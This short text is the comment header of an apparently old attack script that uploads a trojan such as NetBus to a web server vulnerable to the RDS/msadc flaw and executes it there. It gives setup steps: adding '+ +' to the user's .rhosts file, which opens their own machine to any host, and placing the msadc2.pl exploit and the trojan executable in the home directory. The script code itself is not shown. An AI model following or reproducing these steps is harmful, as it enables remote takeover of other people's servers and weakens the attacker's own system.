# This script will upload a trojan to an RDS vulnerable site and will execute the trojan
# (as long as it runs on NT, i.e. netbus)
#
# Add "+ +" to your .rhosts file 
# (yes i know this will make you vulnerable to certain types of shit)
# and put msadc2.pl (by r.f.p, www.wiretrip.net/rfp) and the trojan exe in your home directory.
